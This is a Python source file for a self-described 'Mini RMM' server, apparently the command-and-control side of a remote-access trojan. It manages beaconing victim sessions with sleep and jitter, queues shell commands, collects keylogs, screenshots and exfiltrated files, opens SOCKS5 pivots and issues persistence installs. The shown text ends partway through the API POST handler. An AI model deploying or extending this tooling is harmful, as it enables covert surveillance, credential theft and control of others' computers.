#!/usr/bin/env python3
"""
Mini RMM HTTP Server — Compatible with cloudflared quick tunnel
Operator control: REST API under /api/v1/ (use rmm_cli.py or your own automation).
Optional embedded CLI: python server_rmm.py --cli (prompt_toolkit recommended).
Enhanced Features:
- Multi-session management
- Dynamic sleep/jitter configuration
- Tab completion and command history
- One-shot and persistent commands
- File upload/download
- Screenshot capture
- Keylogging support
- Persistence management
"""

from __future__ import annotations

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import argparse
import hashlib
import re
import secrets
import threading
import sys
import urllib.parse
import json
import time
import base64
from datetime import datetime
from collections import deque
import os
import readline
import glob

try:
    from prompt_toolkit.completion import Completer as _PTCompleterBase
except ImportError:
    _PTCompleterBase = object  # RMMPTKCompleter only used when prompt_toolkit is installed

from rmm_ws import OperatorEventHub, WebSocketConnection
from rmm_socks import DEFAULT_SOCKS_PORT, DEFAULT_BIND_HOST, SocksManager

# History: GNU readline loads this in _run_cli_readline; prompt_toolkit FileHistory uses the same path in _run_cli_prompt_toolkit
HISTORY_FILE = os.path.expanduser("~/.RMM_history")

# Configuration (overridden by argparse in main())
PORT = 8080
LOG_DIR = "RMM_logs"
WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web")
SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")
WEB_MIME = {
    ".html": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".svg": "image/svg+xml",
    ".ico": "image/x-icon",
}
API_PREFIX = "/api/v1"
API_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()
BEACON_SECRET = os.environ.get("RMM_BEACON_SECRET", "").strip()
INSECURE = False
LISTEN_HOST = "127.0.0.1"
MAX_RESULT_EVENTS = 500
MAX_BODY_BYTES = 10 * 1024 * 1024


def secure_compare(provided: str, expected: str) -> bool:
    """Constant-time secret comparison."""
    if not expected:
        return False
    if provided is None:
        provided = ""
    a = provided.encode("utf-8", errors="replace")
    b = expected.encode("utf-8", errors="replace")
    return secrets.compare_digest(a, b)


_BEACON_SESSION_UUID_RE = re.compile(
    r"^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}$"
)
_BEACON_SESSION_TOKEN_RE = re.compile(r"^[A-Za-z0-9_-]{8,128}$")


def validate_beacon_session_id(session_id: str) -> str | None:
    """Reject path-like or unsafe beacon session IDs (blocks /tmp/pwn style abuse)."""
    if not session_id or not isinstance(session_id, str):
        return None
    sid = session_id.strip()
    if len(sid) < 8 or len(sid) > 128:
        return None
    if "/" in sid or "\\" in sid or ".." in sid or "\0" in sid:
        return None
    if sid.startswith(".") or sid.endswith("."):
        return None
    if _BEACON_SESSION_UUID_RE.match(sid):
        return sid
    if _BEACON_SESSION_TOKEN_RE.match(sid):
        return sid
    return None


def safe_session_storage_prefix(session_id: str) -> str:
    """Hash-based prefix for artifact filenames — never use session_id[:8] on disk."""
    return hashlib.sha256(session_id.encode("utf-8")).hexdigest()[:12]


def safe_storage_filename(filename: str, default: str = "download") -> str:
    """Basename-only filename safe for writes under LOG_DIR (blocks path traversal)."""
    if not filename or not isinstance(filename, str):
        return default
    name = os.path.basename(filename.replace("\\", "/")).strip().strip(".")
    if not name or name in (".", "..") or ".." in name:
        return default
    cleaned = "".join(c for c in name if c.isalnum() or c in "._- ")
    cleaned = cleaned.strip()[:200]
    return cleaned if cleaned else default


def safe_join_under(base_dir: str, *parts: str) -> str:
    """Join paths and ensure the result stays under base_dir."""
    base = os.path.realpath(base_dir)
    path = os.path.realpath(os.path.join(base, *parts))
    if path != base and not path.startswith(base + os.sep):
        raise ValueError("path escapes storage directory")
    return path

# Create directories
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "downloads"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "screenshots"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "keylogs"), exist_ok=True)

# ANSI Colors
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class Session:
    def __init__(self, session_id, hostname, username, ip=None):
        self.id = session_id
        self.hostname = hostname
        self.username = username
        self.ip = ip
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.cmd_queue = deque()
        self.persistent_cmd = None
        self.cmd_timeout = 30
        self.work_dir = None
        self.os_type = "windows"
        # Configuration parameters
        self.sleep_seconds = 60  # Default 1 minute
        self.jitter_percent = 30  # Default 30% jitter
        self.result_events = deque(maxlen=MAX_RESULT_EVENTS)
        self._event_seq = 0
        self.wait_lock = threading.Lock()
        self.wait_event = None
        self.wait_result = None
    
    def beacon_status(self):
        """online / stale / offline from last beacon poll vs configured sleep+jitter."""
        elapsed = (datetime.now() - self.last_seen).total_seconds()
        jitter_max = self.sleep_seconds * (self.jitter_percent / 100.0)
        expected_max = self.sleep_seconds + jitter_max + 15
        if elapsed <= expected_max * 1.5:
            return "online"
        if elapsed <= expected_max * 4:
            return "stale"
        return "offline"

    def to_dict(self):
        elapsed = int((datetime.now() - self.last_seen).total_seconds())
        return {
            "id": self.id,
            "hostname": self.hostname,
            "username": self.username,
            "ip": self.ip,
            "first_seen": self.first_seen.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "last_seen_ago_seconds": elapsed,
            "beacon_status": self.beacon_status(),
            "work_dir": self.work_dir,
            "os_type": self.os_type,
            "sleep_seconds": self.sleep_seconds,
            "jitter_percent": self.jitter_percent
        }
    
    def __str__(self):
        return f"{Colors.GREEN}{self.username}@{self.hostname}{Colors.END} [{self.id[:8]}]"

class Completer:
    """Custom completer for readline"""

    def __init__(self, server):
        self.server = server
        self.commands = [
            'list', 'use', 'info', 'background', 'kill',
            'set_sleep', 'set_jitter', 'show_config',
            'download', 'upload', 'screenshot', 'socks',
            'keylog', 'persist', 'stop',
            'install_persist', 'remove_persist',
            'help', 'clear', 'quit', 'exit',
        ]
        self.keylog_actions = ['start', 'stop', 'dump']

    def complete(self, text, state):
        """Return possible completions for the current text"""
        line = readline.get_line_buffer()
        parts = line.split()
        
        # If no text or first word being completed
        if not parts or (len(parts) == 1 and not line.endswith(' ')):
            matches = [cmd for cmd in self.commands if cmd.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete arguments for specific commands
        cmd = parts[0].lower()
        
        # Complete session IDs for 'use' and 'kill'
        if cmd in ['use', 'kill'] and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            if self.server.sessions:
                session_ids = [sid[:8] for sid in self.server.sessions.keys()]
                matches = [sid for sid in session_ids if sid.startswith(text)]
                if state < len(matches):
                    return matches[state]
            return None
        
        # Complete keylog actions
        if cmd == 'keylog' and (len(parts) == 1 or (len(parts) == 2 and not line.endswith(' '))):
            matches = [action for action in self.keylog_actions if action.startswith(text)]
            if state < len(matches):
                return matches[state] + ' '
            return None
        
        # Complete local files for 'upload'
        if cmd == 'upload' and len(parts) == 2 and not line.endswith(' '):
            # Complete local file path
            matches = glob.glob(text + '*')
            if state < len(matches):
                return matches[state]
            return None
        
        return None


class RMMPTKCompleter(_PTCompleterBase):
    """prompt_toolkit completer mirroring Completer (no readline.get_line_buffer)."""

    def __init__(self, server):
        super().__init__()
        self.server = server
        self._words = Completer(server)

    def get_completions(self, document, complete_event):
        from prompt_toolkit.completion import Completion

        line = document.text_before_cursor
        parts = line.split()

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            prefix = parts[0] if parts else ""
            for cmd in self._words.commands:
                if cmd.startswith(prefix):
                    yield Completion(cmd + " ", start_position=-len(prefix))
            return

        cmd = parts[0].lower()

        if cmd in ("use", "kill"):
            if len(parts) == 1 and line.endswith(" "):
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    yield Completion(s8 + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for sid in self.server.sessions:
                    s8 = sid[:8]
                    if s8.startswith(prefix):
                        yield Completion(s8, start_position=-len(prefix))
                return

        if cmd == "keylog":
            if len(parts) == 1 and line.endswith(" "):
                for a in self._words.keylog_actions:
                    yield Completion(a + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for a in self._words.keylog_actions:
                    if a.startswith(prefix):
                        yield Completion(a + " ", start_position=-len(prefix))
                return

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            prefix = parts[1]
            for m in glob.glob(prefix + "*"):
                yield Completion(m, start_position=-len(prefix))
            return


def _build_cli_prompt(server):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    prefix = f"{Colors.DIM}[{ts}]{Colors.END} "
    if server.current_session:
        sess = server.get_session(server.current_session)
        if sess:
            return f"{prefix}{Colors.GREEN}RMM [{sess.id[:8]}] > {Colors.END}"
        server.current_session = None
    return f"{prefix}{Colors.GREEN}RMM > {Colors.END}"


def _run_cli_prompt_toolkit(server, cli):
    """Fixed bottom input line; client output prints above (patch_stdout)."""
    from prompt_toolkit import PromptSession
    from prompt_toolkit.formatted_text import ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.patch_stdout import patch_stdout

    server._cli_use_ptk = True
    session = PromptSession(
        history=FileHistory(HISTORY_FILE),
        completer=RMMPTKCompleter(server),
        complete_style="COLUMN",
        enable_history_search=True,
    )
    with patch_stdout():
        while server.running:
            try:
                prompt = _build_cli_prompt(server)
                cmd = session.prompt(ANSI(prompt))
                if not cli.execute_command(cmd):
                    break
            except KeyboardInterrupt:
                # Ctrl+C: cancel current line (like a shell); do not exit the server
                continue
            except EOFError:
                # Ctrl+D: end session (empty buffer in prompt_toolkit)
                server.tty_print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
                break


def _run_cli_readline(server, cli):
    """Fallback: stdlib readline + input() when prompt_toolkit is not installed."""
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass
    readline.set_history_length(1000)
    completer = Completer(server)
    readline.set_completer(completer.complete)
    readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" \t\n;")

    while server.running:
        try:
            prompt = _build_cli_prompt(server)
            cmd = input(prompt)
            if not cli.execute_command(cmd):
                break
        except KeyboardInterrupt:
            print()
            continue
        except EOFError:
            print(f"\n{Colors.YELLOW}Goodbye!{Colors.END}")
            break


class RMMServer:
    def __init__(self):
        self.sessions = {}
        self.killed_sessions = set()
        self.session_lock = threading.Lock()
        self.tty_lock = threading.Lock()  # Serialize async client stdout
        self._cli_use_ptk = False  # True when using prompt_toolkit (skip readline.redisplay in handle_result)
        self.current_session = None
        self.running = True
        self.event_hub = OperatorEventHub()
        self.socks = SocksManager(log_fn=self.log)

    @staticmethod
    def _format_ago(seconds):
        if seconds < 60:
            return f"{seconds}s ago"
        if seconds < 3600:
            return f"{seconds // 60}m ago"
        if seconds < 86400:
            return f"{seconds // 3600}h ago"
        return f"{seconds // 86400}d ago"

    def tty_print(self, msg="", *, ansi=True, end="\n", flush=True):
        """Stdout for CLI/logs. Under prompt_toolkit.patch_stdout, plain print() corrupts ESC (shows as '?')."""
        if self._cli_use_ptk:
            from prompt_toolkit import print_formatted_text
            if ansi:
                from prompt_toolkit.formatted_text import ANSI
                print_formatted_text(ANSI(msg), end=end)
            else:
                print_formatted_text(msg, end=end)
            if flush:
                sys.stdout.flush()
        else:
            print(msg, end=end, flush=flush)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CMD": Colors.BLUE
        }.get(level, Colors.END)
        self.tty_print(f"{Colors.DIM}[{timestamp}]{Colors.END} {color}[{level}]{Colors.END} {message}")
    
    def save_session(self, session):
        sessions_data = {}
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'r') as f:
                sessions_data = json.load(f)
        
        sessions_data[session.id] = session.to_dict()
        
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions_data, f, indent=2)
    
    def touch_session(self, session_id):
        """Update last_seen when a beacon polls or posts a result."""
        with self.session_lock:
            session = self.sessions.get(session_id)
            if session:
                session.last_seen = datetime.now()
                return True
        return False

    def get_session(self, session_id):
        with self.session_lock:
            return self.sessions.get(session_id)
    
    def find_session_by_prefix(self, prefix):
        """Find a session by ID prefix (minimum 4 characters)"""
        with self.session_lock:
            matching_sessions = []
            for session_id, session in self.sessions.items():
                if session_id.startswith(prefix):
                    matching_sessions.append((session_id, session))
            
            if len(matching_sessions) == 1:
                return matching_sessions[0][1]
            elif len(matching_sessions) > 1:
                self.tty_print(f"{Colors.YELLOW}Multiple sessions match prefix '{prefix}':{Colors.END}")
                for sid, session in matching_sessions:
                    self.tty_print(f"  {sid[:8]} - {session.username}@{session.hostname}", ansi=False)
                return None
            else:
                return None

    def resolve_session(self, session_id_or_prefix):
        """Resolve session by full id or unique prefix (4+ chars)."""
        session = self.get_session(session_id_or_prefix)
        if session:
            return session
        if len(session_id_or_prefix) >= 4:
            return self.find_session_by_prefix(session_id_or_prefix)
        return None

    @staticmethod
    def _artifact_public_url(filepath):
        if not filepath:
            return None
        real = os.path.realpath(filepath)
        for kind in ("downloads", "screenshots"):
            base = os.path.realpath(os.path.join(LOG_DIR, kind))
            if real == base or real.startswith(base + os.sep):
                return f"{API_PREFIX}/artifacts/{kind}/{os.path.basename(real)}"
        return None

    def record_operator_action(self, session, command: str, action: str = "queued"):
        """Log operator commands for shared history (web UI, rmm_cli, API)."""
        if not session or not command:
            return
        self._record_event(session, "operator", f"{action}: {command}", command=command)

    def _record_event(self, session, event_type, body, command=None, artifact=None):
        artifact_url = self._artifact_public_url(artifact) if artifact else None
        with self.session_lock:
            session._event_seq += 1
            ev = {
                "id": session._event_seq,
                "timestamp": datetime.now().isoformat(),
                "type": event_type,
                "body": body,
                "command": command,
                "artifact": artifact,
                "artifact_url": artifact_url,
            }
            session.result_events.append(ev)
        self.event_hub.broadcast_event(session.id, ev)
        with session.wait_lock:
            if session.wait_event is not None:
                session.wait_result = ev
                session.wait_event.set()

    def sessions_to_json(self):
        with self.session_lock:
            return [s.to_dict() for s in self.sessions.values()]

    def kill_session(self, session_id_or_prefix):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return False, "not_found"
        with self.session_lock:
            self.killed_sessions.add(session.id)
            if session.id in self.sessions:
                del self.sessions[session.id]
            if self.current_session == session.id:
                self.current_session = None
        self.event_hub.broadcast_sessions(self.sessions_to_json())
        self.socks.stop(session.id)
        return True, session.id

    def start_socks(self, session_id: str, port: int = DEFAULT_SOCKS_PORT, bind_host: str = DEFAULT_BIND_HOST) -> bool:
        session = self.get_session(session_id)
        if not session:
            return False
        try:
            self.socks.start(session_id, port=port, bind_host=bind_host)
        except OSError as e:
            self.log(f"SOCKS failed to bind {bind_host}:{port}: {e}", "ERROR")
            return False
        self.record_operator_action(session, f"socks {port}", "socks")
        self._record_event(
            session,
            "output",
            f"SOCKS5 listening on {bind_host}:{port} (socks5://{bind_host}:{port})",
            command=f"socks {port}",
        )
        return True

    def stop_socks(self, session_id: str) -> bool:
        stopped = self.socks.stop(session_id)
        session = self.get_session(session_id)
        if session:
            self.record_operator_action(session, "socks stop", "socks")
            if stopped:
                self._record_event(session, "output", "SOCKS relay stopped", command="socks stop")
        return stopped

    def socks_active(self, session_id: str) -> bool:
        return self.socks.get(session_id) is not None

    def exec_and_wait(self, session_id_or_prefix, command, timeout=120):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None, "not_found"
        event = threading.Event()
        with session.wait_lock:
            session.wait_event = event
            session.wait_result = None
        if not self.set_command(session.id, command, "oneshot"):
            with session.wait_lock:
                session.wait_event = None
            return None, "not_found"
        if not event.wait(timeout):
            with session.wait_lock:
                session.wait_event = None
            return None, "timeout"
        with session.wait_lock:
            result = session.wait_result
            session.wait_event = None
            session.wait_result = None
        return result, "ok"

    def get_events(self, session_id_or_prefix, since_id=0, limit=50):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None
        with self.session_lock:
            events = [e for e in session.result_events if e["id"] > since_id]
        if limit > 0:
            events = events[-limit:]
        return events
    
    def register_session(
        self,
        session_id,
        hostname,
        username,
        ip=None,
        sleep_seconds=None,
        jitter_percent=None,
        sync_client_config=False,
    ):
        to_save = None
        is_new = False
        with self.session_lock:
            if session_id in self.killed_sessions:
                return None
            if session_id not in self.sessions:
                session = Session(session_id, hostname, username, ip)
                if sleep_seconds is not None:
                    session.sleep_seconds = max(1, min(3600, int(sleep_seconds)))
                if jitter_percent is not None:
                    session.jitter_percent = max(0, min(100, int(jitter_percent)))
                self.sessions[session_id] = session
                to_save = session
                is_new = True
            else:
                s = self.sessions[session_id]
                s.last_seen = datetime.now()
                s.hostname = hostname
                s.username = username
                if ip is not None:
                    s.ip = ip
                if sync_client_config:
                    if sleep_seconds is not None:
                        s.sleep_seconds = max(1, min(3600, int(sleep_seconds)))
                    if jitter_percent is not None:
                        s.jitter_percent = max(0, min(100, int(jitter_percent)))
                to_save = s
        if to_save is not None:
            self.save_session(to_save)
        if is_new:
            self.log(f"New session: {to_save}", "SUCCESS")
            self.event_hub.broadcast_sessions(self.sessions_to_json())
            return True
        return False
    
    def update_session_config(self, session_id, sleep_seconds=None, jitter_percent=None):
        session = self.get_session(session_id)
        if session:
            with self.session_lock:
                if sleep_seconds is not None:
                    session.sleep_seconds = max(1, min(3600, sleep_seconds))
                if jitter_percent is not None:
                    session.jitter_percent = max(0, min(100, jitter_percent))
            self.save_session(session)
            return True
        return False
    
    def list_sessions(self):
        with self.session_lock:
            if not self.sessions:
                self.tty_print(f"{Colors.YELLOW}No active sessions{Colors.END}")
                return

            self.tty_print(f"\n{Colors.BOLD}Active Sessions:{Colors.END}")
            self.tty_print(
                f"{'ID':<10} {'User':<15} {'Hostname':<20} {'Sleep':<8} {'Jitter':<8} "
                f"{'Last seen':<12} {'Status':<8}",
                ansi=False,
            )
            self.tty_print("-" * 95, ansi=False)
            for sid, session in self.sessions.items():
                ago = int((datetime.now() - session.last_seen).total_seconds())
                status = session.beacon_status()
                self.tty_print(
                    f"{sid[:8]:<10} {session.username:<15} {session.hostname:<20} "
                    f"{session.sleep_seconds:<8} {session.jitter_percent:<8}% "
                    f"{self._format_ago(ago):<12} {status:<8}",
                    ansi=False,
                )
            self.tty_print("", ansi=False)
    
    def set_command(self, session_id, command, cmd_type="oneshot"):
        session = self.get_session(session_id)
        if not session:
            return False
        with self.session_lock:
            if command == "__STOP__":
                session.persistent_cmd = None
                return True
            if cmd_type == "persistent":
                session.cmd_queue.clear()
                session.persistent_cmd = command
                return True
            session.cmd_queue.append(command)
        return True
    
    def get_command(self, session_id):
        """Return (command_string, response_type) for JSON /cmd responses.
        response_type: none | config | execute | persistent
        One-shot commands are queued (FIFO). Persistent runs until __STOP__.
        """
        with self.session_lock:
            if session_id in self.killed_sessions:
                return ("__EXIT__", "execute")
        session = self.get_session(session_id)
        if not session:
            return ("", "none")
        self.touch_session(session_id)
        with self.session_lock:
            if session.persistent_cmd is not None:
                return (session.persistent_cmd, "persistent")
            if session.cmd_queue:
                cmd = session.cmd_queue.popleft()
                return (cmd, "execute")
            config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
            return (config_cmd, "config")

    @staticmethod
    def _unwrap_rmm_result_text(body: str) -> tuple:
        """If client sent JSON {rmm_cmd, rmm_output}, return (text, cmd_echo); else (body, None)."""
        if not body or not body.lstrip().startswith("{"):
            return (body, None)
        try:
            d = json.loads(body)
        except json.JSONDecodeError:
            return (body, None)
        if isinstance(d, dict) and "rmm_output" in d:
            out = d.get("rmm_output", "")
            if out is None:
                out = ""
            elif not isinstance(out, str):
                out = str(out)
            cmd_echo = d.get("rmm_cmd")
            if cmd_echo is not None and not isinstance(cmd_echo, str):
                cmd_echo = str(cmd_echo)
            return (out, cmd_echo)
        return (body, None)

    def handle_result(self, session_id, result, cmd_type="output"):
        session = self.get_session(session_id)
        if not session:
            return
        self.touch_session(session_id)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        tty_lines = []
        artifact = None
        event_body = result
        echoed_cmd = None

        if cmd_type == "file_upload":
            try:
                data = json.loads(result)
                raw_name = data.get("filename", f"unknown_{timestamp}")
                filename = safe_storage_filename(raw_name, f"unknown_{timestamp}")
                content = base64.b64decode(data.get("content", ""))
                filepath = safe_join_under(
                    os.path.join(LOG_DIR, "downloads"),
                    f"{safe_session_storage_prefix(session.id)}_{filename}",
                )
                with open(filepath, 'wb') as f:
                    f.write(content)
                artifact = filepath
                event_body = f"saved to {filepath}"
                tty_lines.append(("log", f"File downloaded: {filepath}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Download error: {e}", "ERROR"))

        elif cmd_type == "screenshot":
            try:
                content = base64.b64decode(result)
                filepath = safe_join_under(
                    LOG_DIR,
                    "screenshots",
                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.png",
                )
                with open(filepath, 'wb') as f:
                    f.write(content)
                artifact = filepath
                event_body = filepath
                tty_lines.append(("log", f"Screenshot saved: {filepath}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Screenshot error: {e}", "ERROR"))

        elif cmd_type == "keylog":
            try:
                filepath = safe_join_under(
                    LOG_DIR,
                    "keylogs",
                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.log",
                )
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(result)
                artifact = filepath
                event_body = result[:2000] if len(result) > 2000 else result
                tty_lines.append(("log", f"Keylog saved: {filepath}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Keylog save error: {e}", "ERROR"))

        elif cmd_type == "config_ack":
            event_body = result
            tty_lines.append(("log", f"Session {session.id[:8]} acknowledged config update", "SUCCESS"))

        else:
            text, echoed_cmd = self._unwrap_rmm_result_text(result)
            event_body = text
            line = f"\n{Colors.DIM}[Result from {session}]"
            if echoed_cmd:
                line += f" » {echoed_cmd}"
            line += f"{Colors.END}"
            tty_lines.append(("result", line, text))

        self._record_event(session, cmd_type, event_body, command=echoed_cmd, artifact=artifact)

        with self.tty_lock:
            for kind, *rest in tty_lines:
                if kind == "log":
                    self.log(rest[0], rest[1])
                elif kind == "result":
                    self.tty_print(rest[0])
                    self.tty_print(rest[1], ansi=False)
                    self.tty_print(f"{Colors.DIM}{'='*60}{Colors.END}")
            sys.stdout.flush()
            if not self._cli_use_ptk:
                try:
                    readline.redisplay()
                except Exception:
                    pass

class RMMHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass

    def handle(self):
        """Suppress BrokenPipe when clients close before reading the response."""
        try:
            super().handle()
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _safe_write(self, data: bytes) -> None:
        try:
            self.wfile.write(data)
        except (BrokenPipeError, ConnectionResetError):
            pass
    
    def _respond(self, code, body="", content_type="text/plain"):
        try:
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            self.end_headers()
            if body:
                payload = body.encode() if isinstance(body, str) else body
                self._safe_write(payload)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _json(self, code, payload):
        self._respond(code, json.dumps(payload), "application/json")

    def _read_body_bytes(self):
        length = int(self.headers.get("Content-Length", 0))
        if length > MAX_BODY_BYTES:
            raise ValueError("body_too_large")
        if length <= 0:
            return b""
        return self.rfile.read(length)

    def _read_json_body(self):
        raw = self._read_body_bytes().decode(errors="replace")
        if not raw.strip():
            return {}
        return json.loads(raw)

    def _api_token_from_request(self, qs=None):
        auth = self.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:].strip()
        header = self.headers.get("X-RMM-Token", "").strip()
        if header:
            return header
        if qs:
            return qs.get("token", [""])[0].strip()
        return ""

    def _api_authorized(self, qs=None):
        if INSECURE and not API_TOKEN:
            return True
        if not API_TOKEN:
            return False
        return secure_compare(self._api_token_from_request(qs), API_TOKEN)

    def _api_unauthorized(self):
        self._json(401, {"error": "unauthorized", "detail": "Valid RMM_API_TOKEN required (Bearer or X-RMM-Token)"})

    def _handle_websocket_upgrade(self, qs):
        if self.headers.get("Upgrade", "").lower() != "websocket":
            self._respond(400, "Expected WebSocket upgrade")
            return True
        if not self._api_authorized(qs):
            self._respond(401, "Unauthorized")
            return True

        ws = WebSocketConnection.from_http_request(
            self.connection,
            {k: self.headers[k] for k in self.headers},
            self.path,
        )
        if not ws:
            self._respond(400, "WebSocket handshake failed")
            return True

        session_filter = qs.get("session", [None])[0]
        hub = self.server_instance.event_hub
        hub.add(ws, session_filter)
        self.close_connection = False

        try:
            hub.broadcast_sessions(self.server_instance.sessions_to_json())
            while self.server_instance.running and not ws.closed:
                msg = ws.recv_json()
                if msg is None:
                    break
                if msg.get("op") == "_timeout":
                    ws.send_json({"op": "ping"})
                    continue
                if msg.get("op") == "subscribe":
                    hub.set_filter(ws, msg.get("session_id"))
                    ws.send_json({"op": "subscribed", "session_id": msg.get("session_id")})
        finally:
            hub.remove(ws)
            ws.close()
        return True

    def _serve_artifact(self, kind: str, filename: str):
        if kind not in ("downloads", "screenshots"):
            self._json(404, {"error": "not_found"})
            return True
        safe = safe_storage_filename(filename, "")
        if not safe:
            self._json(400, {"error": "invalid_filename"})
            return True
        try:
            path = safe_join_under(os.path.join(LOG_DIR, kind), safe)
        except ValueError:
            self._json(403, {"error": "forbidden"})
            return True
        if not os.path.isfile(path):
            self._json(404, {"error": "not_found"})
            return True
        mime = "image/png" if kind == "screenshots" else "application/octet-stream"
        with open(path, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self._safe_write(data)
        return True

    def _beacon_token_from_request(self, qs):
        header = self.headers.get("X-RMM-Beacon-Token", "").strip()
        if header:
            return header
        return qs.get("beacon_token", [""])[0].strip()

    @staticmethod
    def _beacon_session_id_from_qs(qs) -> tuple[str | None, str | None]:
        """Return (error_message, session_id). error_message is set when id is missing or invalid."""
        raw = qs.get("id", [None])[0]
        if raw is None or not str(raw).strip():
            return "Missing session ID", None
        session_id = validate_beacon_session_id(str(raw))
        if not session_id:
            return "INVALID SESSION ID", None
        return None, session_id

    def _beacon_authorized(self, qs):
        if INSECURE and not BEACON_SECRET:
            return True
        if not BEACON_SECRET:
            return False
        return secure_compare(self._beacon_token_from_request(qs), BEACON_SECRET)

    def _beacon_forbidden(self):
        self._respond(403, "FORBIDDEN")

    def _serve_web(self, path: str) -> bool:
        """Serve static files from WEB_DIR under /ui/ (and redirect / → /ui/)."""
        if path in ("", "/"):
            self.send_response(302)
            self.send_header("Location", "/ui/")
            self.end_headers()
            return True

        if not path.startswith("/ui"):
            return False

        rel = path[len("/ui") :].lstrip("/") or "index.html"
        if ".." in rel or rel.startswith(("/", "\\")):
            self._respond(403, "Forbidden")
            return True

        filepath = os.path.realpath(os.path.join(WEB_DIR, rel))
        web_root = os.path.realpath(WEB_DIR)
        if filepath != web_root and not filepath.startswith(web_root + os.sep):
            self._respond(403, "Forbidden")
            return True
        if not os.path.isfile(filepath):
            self._respond(404, "Not Found")
            return True

        ext = os.path.splitext(filepath)[1].lower()
        with open(filepath, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", WEB_MIME.get(ext, "application/octet-stream"))
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self._safe_write(data)
        return True

    def _api_path_parts(self, path):
        if not path.startswith(API_PREFIX + "/"):
            return None
        rest = path[len(API_PREFIX) + 1 :]
        return [p for p in rest.split("/") if p]

    def _handle_api_get(self, path, qs):
        if not self._api_authorized(qs):
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if parts == ["health"]:
            self._json(200, {"status": "ok", "sessions": len(srv.sessions)})
            return True

        if parts == ["sessions"]:
            self._json(200, {"sessions": srv.sessions_to_json()})
            return True

        if len(parts) == 2 and parts[0] == "sessions":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"session": session.to_dict()})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "events":
            since_id = int(qs.get("since", ["0"])[0] or 0)
            limit = int(qs.get("limit", ["50"])[0] or 50)
            events = srv.get_events(parts[1], since_id=since_id, limit=limit)
            if events is None:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"events": events})
            return True

        if len(parts) == 3 and parts[0] == "artifacts":
            return self._serve_artifact(parts[1], parts[2])

        self._json(404, {"error": "not_found"})
        return True

    def _handle_api_post(self, path, body):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "commands":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            command = body.get("command", "")
            cmd_type = body.get("type", "oneshot")
            if cmd_type not in ("oneshot", "persistent"):
                self._json(400, {"error": "invalid_type"})
                return True
            if not command:
                self._json(400, {"error": "missing_command"})
                return True
            srv.set_command(session.id, command, cmd_type)
            srv.record_operator_action(session, command, "queued" if cmd_type == "oneshot" else "persist")
            self._json(200, {"ok": True, "session_id": session.id})
            return True

